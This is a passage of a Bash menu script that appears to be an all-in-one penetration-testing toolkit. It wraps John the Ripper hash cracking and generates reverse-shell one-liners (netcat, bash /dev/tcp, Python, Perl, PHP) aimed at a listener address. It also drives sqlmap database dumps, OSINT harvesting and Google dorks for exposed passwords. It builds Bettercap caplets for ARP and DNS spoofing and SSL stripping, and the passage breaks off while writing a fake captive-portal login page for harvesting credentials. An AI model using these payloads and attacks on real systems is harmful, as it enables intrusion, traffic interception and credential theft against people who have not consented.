                john --format=crypt "$shadow_path" --wordlist=/usr/share/wordlists/rockyou.txt
            else
                if [[ ! -f "$passwd_path" ]]; then
                    echo -e "\033[1;31mPasswd file not found! Running John on shadow file only...\033[0m"
                    john --format=crypt "$shadow_path" --wordlist=/usr/share/wordlists/rockyou.txt
                else
                    echo -e "\033[1;33m[*] Creating unshadowed file...\033[0m"
                    if [[ "$save_choice" == "S" || "$save_choice" == "s" ]]; then
                        unshadow "$passwd_path" "$shadow_path" > results/unshadowed.txt
                        echo -e "\033[1;32m[*] Unshadowed file saved to 'results/unshadowed.txt'\033[0m"
                        echo -e "\033[1;33m[*] Running John on unshadowed file...\033[0m"
                        john --wordlist=/usr/share/wordlists/rockyou.txt results/unshadowed.txt
                    else
                        # Use process substitution for temporary processing
                        echo -e "\033[1;33m[*] Running John on unshadowed data...\033[0m"
                        john --wordlist=/usr/share/wordlists/rockyou.txt <(unshadow "$passwd_path" "$shadow_path")
                    fi
                fi
            fi
            ;;
        2)
            echo -e "\033[1;34mEnter the path to the NTLM hash file:\033[0m"
            read ntlm_path
            if [[ ! -f "$ntlm_path" ]]; then
                echo -e "\033[1;31mFile not found!\033[0m"
                return
            fi
            echo -e "\033[1;33m[*] Running John on NTLM hash file...\033[0m"
            john --format=NT "$ntlm_path" --wordlist=/usr/share/wordlists/rockyou.txt
            ;;
        3)
            echo -e "\033[1;34mEnter the path to the MD5 hash file or paste hash directly:\033[0m"
            read md5_input
            
            # Check if input is a file or direct hash
            if [[ -f "$md5_input" ]]; then
                echo -e "\033[1;33m[*] Running John on MD5 hash file...\033[0m"
                john --format=raw-md5 "$md5_input" --wordlist=/usr/share/wordlists/rockyou.txt
            else
                echo -e "\033[1;33m[*] Running John on provided MD5 hash...\033[0m"
                echo "$md5_input" > /tmp/temp_md5_hash.txt
                john --format=raw-md5 /tmp/temp_md5_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
                rm /tmp/temp_md5_hash.txt
            fi
            ;;
        4)
            echo -e "\033[1;34mEnter the path to the SHA hash file or paste hash directly:\033[0m"
            read sha_input
            
            echo -e "\033[1;34mSelect SHA format:\033[0m"
            echo -e "\033[1;36m1)\033[0m \033[1;32mSHA1\033[0m"
            echo -e "\033[1;36m2)\033[0m \033[1;32mSHA256\033[0m"
            echo -e "\033[1;36m3)\033[0m \033[1;32mSHA512\033[0m"
            echo -n "Enter your choice: "
            read sha_choice
            
            case $sha_choice in
                1)
                    format="raw-sha1"
                    ;;
                2)
                    format="raw-sha256"
                    ;;
                3)
                    format="raw-sha512"
                    ;;
                *)
                    format="raw-sha1"
                    echo -e "\033[1;33mUsing default format: SHA1\033[0m"
                    ;;
            esac
            
            # Check if input is a file or direct hash
            if [[ -f "$sha_input" ]]; then
                echo -e "\033[1;33m[*] Running John on SHA hash file...\033[0m"
                john --format=$format "$sha_input" --wordlist=/usr/share/wordlists/rockyou.txt
            else
                echo -e "\033[1;33m[*] Running John on provided SHA hash...\033[0m"
                echo "$sha_input" > /tmp/temp_sha_hash.txt
                john --format=$format /tmp/temp_sha_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
                rm /tmp/temp_sha_hash.txt
            fi
            ;;
        5)
            echo -e "\033[1;34mEnter the path to the ZIP file:\033[0m"
            read zip_path
            if [[ ! -f "$zip_path" ]]; then
                echo -e "\033[1;31mFile not found!\033[0m"
                return
            fi
            
            # Ask if user wants to save hash file
            echo -e "\033[1;34mWould you like to (S)ave generated hash file or use (T)emporary file? (S/T):\033[0m"
            read save_choice
            
            echo -e "\033[1;33m[*] Converting ZIP file for John...\033[0m"
            if [[ "$save_choice" == "S" || "$save_choice" == "s" ]]; then
                zip2john "$zip_path" > results/zip_hash.txt
                echo -e "\033[1;32m[*] ZIP hash saved to 'results/zip_hash.txt'\033[0m"
                echo -e "\033[1;33m[*] Running John on ZIP hash...\033[0m"
                john results/zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
            else
                # Use process substitution for temporary processing
                echo -e "\033[1;33m[*] Running John on ZIP hash...\033[0m"
                john --wordlist=/usr/share/wordlists/rockyou.txt <(zip2john "$zip_path")
            fi
            ;;
        6)
            echo -e "\033[1;34mEnter the path to the RAR file:\033[0m"
            read rar_path
            if [[ ! -f "$rar_path" ]]; then
                echo -e "\033[1;31mFile not found!\033[0m"
                return
            fi
            
            # Ask if user wants to save hash file
            echo -e "\033[1;34mWould you like to (S)ave generated hash file or use (T)emporary file? (S/T):\033[0m"
            read save_choice
            
            echo -e "\033[1;33m[*] Converting RAR file for John...\033[0m"
            if [[ "$save_choice" == "S" || "$save_choice" == "s" ]]; then
                rar2john "$rar_path" > results/rar_hash.txt
                echo -e "\033[1;32m[*] RAR hash saved to 'results/rar_hash.txt'\033[0m"
                echo -e "\033[1;33m[*] Running John on RAR hash...\033[0m"
                john results/rar_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
            else
                # Use process substitution for temporary processing
                echo -e "\033[1;33m[*] Running John on RAR hash...\033[0m"
                john --wordlist=/usr/share/wordlists/rockyou.txt <(rar2john "$rar_path")
            fi
            ;;
        7)
            echo -e "\033[1;34mEnter the hash to crack:\033[0m"
            read direct_hash
            if [[ -z "$direct_hash" ]]; then
                echo -e "\033[1;31mNo hash provided!\033[0m"
                return
            fi
            
            echo -e "\033[1;34mSelect hash format:\033[0m"
            echo -e "\033[1;36m1)\033[0m \033[1;32mMD5\033[0m"
            echo -e "\033[1;36m2)\033[0m \033[1;32mSHA1\033[0m"
            echo -e "\033[1;36m3)\033[0m \033[1;32mSHA256\033[0m"
            echo -e "\033[1;36m4)\033[0m \033[1;32mSHA512\033[0m"
            echo -e "\033[1;36m5)\033[0m \033[1;32mNTLM\033[0m"
            echo -n "Enter your choice: "
            read format_choice
            
            case $format_choice in
                1)
                    format="raw-md5"
                    ;;
                2)
                    format="raw-sha1"
                    ;;
                3)
                    format="raw-sha256"
                    ;;
                4)
                    format="raw-sha512"
                    ;;
                5)
                    format="NT"
                    ;;
                *)
                    format="raw-md5"
                    echo -e "\033[1;33mUsing default format: MD5\033[0m"
                    ;;
            esac
            
            echo -e "\033[1;33m[*] Running John on provided hash...\033[0m"
            echo "$direct_hash" > /tmp/temp_direct_hash.txt
            john --format=$format /tmp/temp_direct_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
            rm /tmp/temp_direct_hash.txt
            ;;
        8)
            echo -e "\033[1;33m[*] Showing cracked passwords...\033[0m"
            john --show all
            ;;
        *)
            echo -e "\033[1;31mInvalid choice! Returning to the main menu.\033[0m"
            return
            ;;
    esac
    
    echo -e "\033[1;32m[*] John the Ripper operation completed.\033[0m"
    echo -e "\033[1;33mPress Enter to continue...\033[0m"
    read
}

# Function to generate Netcat payloads
run_netcat() {
clear
figlet -f  slant  "NetCat" | lolcat
    echo -e "\n\033[1;34m================================\033[0m"
    echo -e "\033[1;34mEnter listener IP address:\033[0m"
    read listener_ip
    
    if [[ -z "$listener_ip" ]]; then
        echo -e "\033[1;31mYou must provide an IP address!\033[0m"
        return
    fi
    
    echo -e "\033[1;34mEnter listener port:\033[0m"
    read listener_port
    
    if [[ -z "$listener_port" ]]; then
        echo -e "\033[1;31mYou must provide a port number!\033[0m"
        return
    fi
    
    echo -e "\033[1;34mSelect payload type:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mBasic reverse shell (Linux)\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mBasic reverse shell (Windows)\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mBash reverse shell\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mPython reverse shell\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mPerl reverse shell\033[0m"
    echo -e "\033[1;36m6)\033[0m \033[1;32mPHP reverse shell\033[0m"
    echo -n "Enter your choice: "
    read payload_choice
    
    echo -e "\n\033[1;32m[*] Generated Payload:\033[0m"
    case $payload_choice in
        1)
            echo -e "\033[1;33mnc $listener_ip $listener_port -e /bin/bash\033[0m"
            ;;
        2)
            echo -e "\033[1;33mnc.exe $listener_ip $listener_port -e cmd.exe\033[0m"
            ;;
        3)
            echo -e "\033[1;33mbash -i >& /dev/tcp/$listener_ip/$listener_port 0>&1\033[0m"
            ;;
        4)
            echo -e "\033[1;33mpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$listener_ip\",$listener_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\033[0m"
            ;;
        5)
            echo -e "\033[1;33mperl -e 'use Socket;\$i=\"$listener_ip\";\$p=$listener_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\033[0m"
            ;;
        6)
            echo -e "\033[1;33mphp -r '\$sock=fsockopen(\"$listener_ip\",$listener_port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\033[0m"
            ;;
        *)
            echo -e "\033[1;31mInvalid choice! No payload generated.\033[0m"
            ;;
    esac
    
    echo -e "\n\033[1;32m[*] Start listener with: nc -lvp $listener_port\033[0m"
    echo -e "\033[1;33mPress Enter to continue...\033[0m"
    read
}

# Function to run SQLMap for SQL injection testing
run_sqlmap() {
    clear 
    figlet -f  slant  "SQL Map" | lolcat
    echo -e "\n\033[1;34m=====================================\033[0m"
    echo -e "\033[1;34mEnter target URL (with parameter, e.g., http://example.com/page.php?id=1):\033[0m"
    read target_url
    
    if [[ -z "$target_url" ]]; then
        echo -e "\033[1;31mYou must provide a target URL!\033[0m"
        return
    fi
    
    echo -e "\033[1;34mSelect scan type:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mBasic scan\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mDatabase fingerprint\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mList tables\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mDump database\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mAdvanced options\033[0m"
    echo -n "Enter your choice: "
    read sqlmap_choice
    
    # Create results directory if it doesn't exist
    mkdir -p results
    
    case $sqlmap_choice in
        1)
            echo -e "\033[1;33m[*] Running basic SQLMap scan...\033[0m"
            sqlmap -u "$target_url" --batch
            ;;
        2)
            echo -e "\033[1;33m[*] Running database fingerprint scan...\033[0m"
            sqlmap -u "$target_url" --batch --fingerprint
            ;;
        3)
            echo -e "\033[1;33m[*] Getting database tables...\033[0m"
            sqlmap -u "$target_url" --batch --tables
            ;;
        4)
            echo -e "\033[1;33m[*] Attempting to dump database...\033[0m"
            sqlmap -u "$target_url" --batch --dump
            ;;
        5)
            echo -e "\033[1;34mEnter custom SQLMap parameters:\033[0m"
            read custom_params
            echo -e "\033[1;33m[*] Running SQLMap with custom parameters...\033[0m"
            sqlmap -u "$target_url" $custom_params
            ;;
        *)
            echo -e "\033[1;31mInvalid choice! Returning to the main menu.\033[0m"
            return
            ;;
    esac
    
    echo -e "\n\033[1;32m[*] SQLMap scan completed.\033[0m"
    echo -e "\033[1;33mPress Enter to continue...\033[0m"
    read
}

# Function to run Nikto Web Scanner
run_nikto() {
    clear
    figlet -f  slant  "Nikto" | lolcat
    echo -e "\n\033[1;34m===============================================\033[0m"
    echo -e "\033[1;34mEnter target URL (e.g., http://example.com):\033[0m"
    read target_url
    
    if [[ -z "$target_url" ]]; then
        echo -e "\033[1;31mYou must provide a target URL!\033[0m"
        return
    fi
    
    echo -e "\033[1;34mSelect scan options:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mBasic scan\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mTuning options (select specific tests)\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mFull scan with SSL check\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mScan with authentication\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mCustom options\033[0m"
    echo -n "Enter your choice: "
    read nikto_choice
    
    # Create results directory if it doesn't exist
    mkdir -p results
    
    # Ask if the user wants to save the result or view it directly
    echo -e "\033[1;34mWould you like to (S)ave or (V)iew the results? (S/V):\033[0m"
    read save_or_view
    
    # Build the Nikto command based on user's choice
    case $nikto_choice in
        1)
            nikto_cmd="nikto -h $target_url"
            ;;
        2)
            echo -e "\033[1;34mSelect tuning options (multiple options can be selected):\033[0m"
            echo -e "\033[1;36m1)\033[0m \033[1;32mFile Upload\033[0m"
            echo -e "\033[1;36m2)\033[0m \033[1;32mMisconfiguration\033[0m"
            echo -e "\033[1;36m3)\033[0m \033[1;32mInformation Disclosure\033[0m"
            echo -e "\033[1;36m4)\033[0m \033[1;32mInjection\033[0m"
            echo -e "\033[1;36m5)\033[0m \033[1;32mAll tests\033[0m"
            echo -n "Enter your choices (e.g., 124 for options 1, 2, and 4): "
            read tuning_options
            
            case $tuning_options in
                1)
                    tune_param="x"
                    ;;
                2)
                    tune_param="c"
                    ;;
                3)
                    tune_param="i"
                    ;;
                4)
                    tune_param="a"
                    ;;
                5)
                    tune_param="0123456789abcde"
                    ;;
                *)
                    # Convert input string to tuning parameters
                    tune_param=""
                    [[ $tuning_options == *"1"* ]] && tune_param+="x"
                    [[ $tuning_options == *"2"* ]] && tune_param+="c"
                    [[ $tuning_options == *"3"* ]] && tune_param+="i"
                    [[ $tuning_options == *"4"* ]] && tune_param+="a"
                    
                    # Default if nothing was selected
                    [[ -z "$tune_param" ]] && tune_param="0123456789abcde"
                    ;;
            esac
            
            nikto_cmd="nikto -h $target_url -Tuning $tune_param"
            ;;
        3)
            nikto_cmd="nikto -h $target_url -ssl -no404"
            ;;
        4)
            echo -e "\033[1;34mEnter username:\033[0m"
            read auth_user
            echo -e "\033[1;34mEnter password:\033[0m"
            read auth_pass
            
            nikto_cmd="nikto -h $target_url -id $auth_user:$auth_pass"
            ;;
        5)
            echo -e "\033[1;34mEnter custom Nikto parameters:\033[0m"
            read custom_params
            
            nikto_cmd="nikto -h $target_url $custom_params"
            ;;
        *)
            echo -e "\033[1;31mInvalid choice! Using basic scan.\033[0m"
            nikto_cmd="nikto -h $target_url"
            ;;
    esac
    
    # Run Nikto based on whether to save or view
    if [[ "$save_or_view" == "S" || "$save_or_view" == "s" ]]; then
        echo -e "\033[1;34mEnter output filename (without extension):\033[0m "
        read output_file
        if [[ -z "$output_file" ]]; then
            output_file="nikto_scan_$(date +%Y%m%d_%H%M%S)"
        fi
        
        echo -e "\033[1;33m[*] Running Nikto scan and saving results...\033[0m"
        $nikto_cmd -o results/$output_file.txt
        echo -e "\033[1;32m[*] Scan completed. Results saved to 'results/$output_file.txt'\033[0m"
    elif [[ "$save_or_view" == "V" || "$save_or_view" == "v" ]]; then
        echo -e "\033[1;33m[*] Running Nikto scan and displaying results...\033[0m"
        $nikto_cmd
        echo -e "\n\033[1;32m[*] Scan completed.\033[0m"
    else
        echo -e "\033[1;31mInvalid choice. Using view mode.\033[0m"
        echo -e "\033[1;33m[*] Running Nikto scan and displaying results...\033[0m"
        $nikto_cmd
        echo -e "\n\033[1;32m[*] Scan completed.\033[0m"
    fi
    
    echo -e "\033[1;33mPress Enter to continue...\033[0m"
    read
}

# Function to run OSINT tools
run_osint() {
    clear
    figlet -f  slant  "OSINT" | lolcat
    echo -e "\n\033[1;34m=== OSINT Tools ===\033[0m"
    echo -e "\033[1;34mSelect OSINT tool:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mWhois Lookup\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mDNS Enumeration\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mEmail Harvester\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mSubdomain Finder\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mGoogle Dorks Generator\033[0m"
    echo -e "\033[1;36m6)\033[0m \033[1;32mMetadata Extractor\033[0m"
    echo -e "\033[1;36m7)\033[0m \033[1;32mSherlock Usernames\033[0m"
    echo -e "\033[1;36m8)\033[0m \033[1;31mBack to Main Menu\033[0m"
    echo -n "Enter your choice: "
    read osint_choice
    
    # Create results directory if it doesn't exist
    mkdir -p results
    
    case $osint_choice in
        1)
            # Whois Lookup
            echo -e "\033[1;34mEnter domain name or IP address:\033[0m"
            read target
            if [[ -z "$target" ]]; then
                echo -e "\033[1;31mTarget required!\033[0m"
                return
            fi
            
            echo -e "\033[1;33m[*] Running Whois lookup...\033[0m"
            whois $target
            echo -e "\n\033[1;32m[*] Whois lookup completed.\033[0m"
            ;;
            
        2)
            # DNS Enumeration with dig, host, or nslookup
            echo -e "\033[1;34mEnter domain name:\033[0m"
            read domain
            if [[ -z "$domain" ]]; then
                echo -e "\033[1;31mDomain required!\033[0m"
                return
            fi
            
            echo -e "\033[1;33m[*] Running DNS enumeration...\033[0m"
            echo -e "\033[1;36m=== A Records ===\033[0m"
            dig +short A $domain
            echo -e "\n\033[1;36m=== MX Records ===\033[0m"
            dig +short MX $domain
            echo -e "\n\033[1;36m=== NS Records ===\033[0m"
            dig +short NS $domain
            echo -e "\n\033[1;36m=== TXT Records ===\033[0m"
            dig +short TXT $domain
            echo -e "\n\033[1;32m[*] DNS enumeration completed.\033[0m"
            ;;
            
        3)
            # Email Harvester using theHarvester
            echo -e "\033[1;34mEnter domain to search for emails:\033[0m"
            read domain
            if [[ -z "$domain" ]]; then
                echo -e "\033[1;31mDomain required!\033[0m"
                return
            fi
            
            echo -e "\033[1;34mSelect search engine:\033[0m"
            echo -e "\033[1;36m1)\033[0m \033[1;32mAll available sources\033[0m"
            echo -e "\033[1;36m2)\033[0m \033[1;32mGoogle\033[0m"
            echo -e "\033[1;36m3)\033[0m \033[1;32mBing\033[0m"
            echo -e "\033[1;36m4)\033[0m \033[1;32mLinkedIn\033[0m"
            echo -n "Enter your choice: "
            read source_choice
            
            case $source_choice in
                1) source="all" ;;
                2) source="google" ;;
                3) source="bing" ;;
                4) source="linkedin" ;;
                *) 
                    source="all"
                    echo -e "\033[1;33mUsing all sources\033[0m"
                    ;;
            esac
            
            echo -e "\033[1;33m[*] Running theHarvester...\033[0m"
            theHarvester -d $domain -b $source -l 500
            echo -e "\n\033[1;32m[*] Email harvesting completed.\033[0m"
            ;;
            
        4)
            # Subdomain Finder using Sublist3r
            echo -e "\033[1;34mEnter domain for subdomain search:\033[0m"
            read domain
            if [[ -z "$domain" ]]; then
                echo -e "\033[1;31mDomain required!\033[0m"
                return
            fi
            
            # Ask if the user wants to save the result or view it directly
            echo -e "\033[1;34mWould you like to (S)ave or (V)iew the results? (S/V):\033[0m"
            read save_or_view
            
            if [[ "$save_or_view" == "S" || "$save_or_view" == "s" ]]; then
                echo -e "\033[1;34mEnter output filename (without extension):\033[0m "
                read output_file
                if [[ -z "$output_file" ]]; then
                    output_file="subdomains_$(date +%Y%m%d_%H%M%S)"
                fi
                
                echo -e "\033[1;33m[*] Running subdomain search and saving results...\033[0m"
                sublist3r -d $domain -o results/$output_file.txt
                echo -e "\033[1;32m[*] Search completed. Results saved to 'results/$output_file.txt'\033[0m"
            else
                echo -e "\033[1;33m[*] Running subdomain search...\033[0m"
                sublist3r -d $domain
                echo -e "\n\033[1;32m[*] Subdomain search completed.\033[0m"
            fi
            ;;
            
        5)
            # Google Dorks Generator
            echo -e "\033[1;34m=== Google Dorks Generator ===\033[0m"
            echo -e "\033[1;34mEnter domain to generate dorks for:\033[0m"
            read domain
            if [[ -z "$domain" ]]; then
                echo -e "\033[1;31mDomain required!\033[0m"
                return
            fi
            
            echo -e "\033[1;32m[*] Generated Google Dorks for $domain:\033[0m"
            echo -e "\033[1;33m1. site:$domain filetype:pdf\033[0m"
            echo -e "\033[1;33m2. site:$domain intitle:\"index of\"\033[0m"
            echo -e "\033[1;33m3. site:$domain intext:password\033[0m"
            echo -e "\033[1;33m4. site:$domain ext:php | ext:asp | ext:aspx | ext:jsp | ext:jspx | ext:swf | ext:fla | ext:xml\033[0m"
            echo -e "\033[1;33m5. site:$domain inurl:login | inurl:signin | intitle:Login | intitle:\"sign in\"\033[0m"
            echo -e "\033[1;33m6. site:$domain intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\"\033[0m"
            echo -e "\033[1;33m7. site:$domain \"powered by\" | \"created by\" | \"built by\"\033[0m"
            echo -e "\033[1;33m8. site:$domain ext:doc | ext:docx | ext:odt | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv\033[0m"
            echo -e "\033[1;33m9. site:$domain inurl:wp- | inurl:plugin | inurl:upload | inurl:download\033[0m"
            echo -e "\033[1;33m10. site:$domain inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config\033[0m"
            ;;
            
        6)
            # Metadata Extractor using exiftool
            echo -e "\033[1;34m=== Metadata Extractor ===\033[0m"
            echo -e "\033[1;34mEnter the file path to extract metadata:\033[0m"
            read file_path
            if [[ ! -f "$file_path" ]]; then
                echo -e "\033[1;31mFile not found!\033[0m"
                return
            fi
            
            echo -e "\033[1;33m[*] Extracting metadata from $file_path...\033[0m"
            exiftool "$file_path"
            echo -e "\n\033[1;32m[*] Metadata extraction completed.\033[0m"
            ;;
            
        7)
            echo -e "\033[1;34m=== Sherlock Username Search ===\033[0m"
echo -e "\033[1;33mNote: This requires Sherlock to be installed. You can install it from https://github.com/sherlock-project/sherlock\033[0m"
echo -e "\033[1;34mEnter the username you want to search for (e.g., 'username'):\033[0m"
read sherlock_username
if [[ -z "$sherlock_username" ]]; then
    echo -e "\033[1;31mUsername required!\033[0m"
    return
fi

# Check if Sherlock is installed
if ! command -v sherlock &> /dev/null; then
    echo -e "\033[1;31mSherlock not found. Install it from https://github.com/sherlock-project/sherlock\033[0m"
    return
fi

echo -e "\033[1;33m[*] Running Sherlock search for username '$sherlock_username'...\033[0m"
sherlock "$sherlock_username"
echo -e "\n\033[1;32m[*] Sherlock search completed.\033[0m"
;;
            
        8)
            # Return to main menu
            return
            ;;
            
        *)
            echo -e "\033[1;31mInvalid choice!\033[0m"
            ;;
    esac
    
    echo -e "\033[1;33mPress Enter to continue...\033[0m"
    read
    
    # After action is completed, show OSINT menu again
    run_osint
}

# Function to run Bettercap
run_bettercap() {
    clear
    figlet -f  slant  "Bettercap" | lolcat
    echo -e "\n\033[1;34m=====================================\033[0m"
    echo -e "\033[1;34mSelect Bettercap operation:\033[0m"
    echo -e "\033[1;36m1)\033[0m \033[1;32mNetwork Reconnaissance (discover hosts)\033[0m"
    echo -e "\033[1;36m2)\033[0m \033[1;32mARP Spoofing\033[0m"
    echo -e "\033[1;36m3)\033[0m \033[1;32mDNS Spoofing\033[0m"
    echo -e "\033[1;36m4)\033[0m \033[1;32mHTTP/HTTPS Proxy\033[0m"
    echo -e "\033[1;36m5)\033[0m \033[1;32mSSL Strip Attack\033[0m"
    echo -e "\033[1;36m6)\033[0m \033[1;32mCaptive Portal\033[0m"
    echo -e "\033[1;36m7)\033[0m \033[1;32mWiFi Monitoring/Deauth\033[0m"
    echo -e "\033[1;36m8)\033[0m \033[1;32mCustom Bettercap Command\033[0m"
    echo -e "\033[1;36m9)\033[0m \033[1;31mBack to Main Menu\033[0m"
    echo -n "Enter your choice: "
    read bettercap_choice
    
    # Get network interface if needed
    get_interface() {
        # List available interfaces
        echo -e "\033[1;34mAvailable interfaces:\033[0m"
        ip -o link show | grep -v "lo" | awk -F': ' '{print $2}'
        echo -e "\033[1;34mEnter interface name (e.g., eth0, wlan0):\033[0m"
        read interface
        
        if [[ -z "$interface" ]]; then
            echo -e "\033[1;31mInterface name required!\033[0m"
            return 1
        fi
        return 0
    }
    
    case $bettercap_choice in
        1)
            # Network Reconnaissance
            if ! get_interface; then return; fi
            
            echo -e "\033[1;33m[*] Starting Bettercap network discovery...\033[0m"
            echo -e "\033[1;33m[*] Press Ctrl+C to stop the scan when done.\033[0m"
            echo -e "\033[1;33m[*] Commands: help, net.show\033[0m"
            
            # Create a basic caplet for host discovery
            echo 'net.probe on' > /tmp/discover.cap
            echo 'ticker on' >> /tmp/discover.cap
            echo 'net.show' >> /tmp/discover.cap
            
            sudo bettercap -iface $interface -caplet /tmp/discover.cap
            rm /tmp/discover.cap
            ;;
            
        2)
            # ARP Spoofing
            if ! get_interface; then return; fi
            
            echo -e "\033[1;34mEnter target IP (leave empty for all hosts):\033[0m"
            read target_ip
            
            echo -e "\033[1;34mEnter gateway IP (optional):\033[0m"
            read gateway_ip
            
            # Create ARP spoofing caplet
            echo 'net.probe on' > /tmp/arp_spoof.cap
            echo 'set arp.spoof.internal true' >> /tmp/arp_spoof.cap
            
            if [[ ! -z "$target_ip" ]]; then
                echo "set arp.spoof.targets $target_ip" >> /tmp/arp_spoof.cap
            fi
            
            if [[ ! -z "$gateway_ip" ]]; then
                echo "set arp.spoof.whitelist $gateway_ip" >> /tmp/arp_spoof.cap
            fi
            
            echo 'arp.spoof on' >> /tmp/arp_spoof.cap
            echo 'net.sniff on' >> /tmp/arp_spoof.cap
            
            echo -e "\033[1;33m[*] Starting ARP spoofing attack...\033[0m"
            echo -e "\033[1;33m[*] Press Ctrl+C to stop the attack.\033[0m"
            
            sudo bettercap -iface $interface -caplet /tmp/arp_spoof.cap
            rm /tmp/arp_spoof.cap
            ;;
            
        3)
            # DNS Spoofing
            if ! get_interface; then return; fi
            
            echo -e "\033[1;34mEnter domain to spoof (e.g., example.com):\033[0m"
            read spoof_domain
            
            echo -e "\033[1;34mEnter IP to redirect to:\033[0m"
            read redirect_ip
            
            if [[ -z "$spoof_domain" || -z "$redirect_ip" ]]; then
                echo -e "\033[1;31mBoth domain and redirect IP are required!\033[0m"
                return
            fi
            
            # Create DNS spoofing caplet
            echo 'net.probe on' > /tmp/dns_spoof.cap
            echo 'set arp.spoof.internal true' >> /tmp/dns_spoof.cap
            echo 'arp.spoof on' >> /tmp/dns_spoof.cap
            echo 'set dns.spoof.domains '$spoof_domain >> /tmp/dns_spoof.cap
            echo 'set dns.spoof.address '$redirect_ip >> /tmp/dns_spoof.cap
            echo 'dns.spoof on' >> /tmp/dns_spoof.cap
            
            echo -e "\033[1;33m[*] Starting DNS spoofing attack...\033[0m"
            echo -e "\033[1;33m[*] Press Ctrl+C to stop the attack.\033[0m"
            
            sudo bettercap -iface $interface -caplet /tmp/dns_spoof.cap
            rm /tmp/dns_spoof.cap
            ;;
            
        4)
            # HTTP/HTTPS Proxy
            if ! get_interface; then return; fi
            
            echo -e "\033[1;34mEnter proxy port (default 8080):\033[0m"
            read proxy_port
            
            if [[ -z "$proxy_port" ]]; then
                proxy_port=8080
            fi
            
            # Create HTTP proxy caplet
            echo 'net.probe on' > /tmp/http_proxy.cap
            echo 'set arp.spoof.internal true' >> /tmp/http_proxy.cap
            echo 'arp.spoof on' >> /tmp/http_proxy.cap
            echo "set http.proxy.port $proxy_port" >> /tmp/http_proxy.cap
            echo 'http.proxy on' >> /tmp/http_proxy.cap
            echo 'net.sniff on' >> /tmp/http_proxy.cap
            
            echo -e "\033[1;33m[*] Starting HTTP proxy on port $proxy_port...\033[0m"
            echo -e "\033[1;33m[*] Press Ctrl+C to stop.\033[0m"
            
            sudo bettercap -iface $interface -caplet /tmp/http_proxy.cap
            rm /tmp/http_proxy.cap
            ;;
            
        5)
            # SSL Strip Attack
            if ! get_interface; then return; fi
            
            # Create SSL strip caplet
            echo 'net.probe on' > /tmp/sslstrip.cap
            echo 'set arp.spoof.internal true' >> /tmp/sslstrip.cap
            echo 'arp.spoof on' >> /tmp/sslstrip.cap
            echo 'set http.proxy.sslstrip true' >> /tmp/sslstrip.cap
            echo 'http.proxy on' >> /tmp/sslstrip.cap
            echo 'net.sniff on' >> /tmp/sslstrip.cap
            
            echo -e "\033[1;33m[*] Starting SSL strip attack...\033[0m"
            echo -e "\033[1;33m[*] Press Ctrl+C to stop the attack.\033[0m"
            
            sudo bettercap -iface $interface -caplet /tmp/sslstrip.cap
            rm /tmp/sslstrip.cap
            ;;
            
        6)
            # Captive Portal
            if ! get_interface; then return; fi
            
            echo -e "\033[1;34mEnter portal title (default: Authentication Required):\033[0m"
            read portal_title
            
            if [[ -z "$portal_title" ]]; then
                portal_title="Authentication Required"
            fi
            
            # Create a directory for storing credentials if it doesn't exist
            mkdir -p results/captive_portal
            
            # Create captive portal caplet
            echo 'net.probe on' > /tmp/captive_portal.cap
            echo 'set arp.spoof.internal true' >> /tmp/captive_portal.cap
            echo 'arp.spoof on' >> /tmp/captive_portal.cap
            echo 'set http.proxy.sslstrip true' >> /tmp/captive_portal.cap
            echo 'set http.server.path /tmp/www' >> /tmp/captive_portal.cap
            echo "set http.server.title \"$portal_title\"" >> /tmp/captive_portal.cap
            echo 'set http.server.address 0.0.0.0' >> /tmp/captive_portal.cap
            echo 'http.proxy on' >> /tmp/captive_portal.cap
            echo 'http.server on' >> /tmp/captive_portal.cap
            echo 'net.sniff on' >> /tmp/captive_portal.cap
            
            # Create a simple web directory for the captive portal
            mkdir -p /tmp/www
            
            # Create a simple HTML login page
            cat > /tmp/www/index.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>$portal_title</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f0f0f0; }
        .container { max-width: 400px; margin: 50px auto; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h2 { color: #333; text-align: center; }
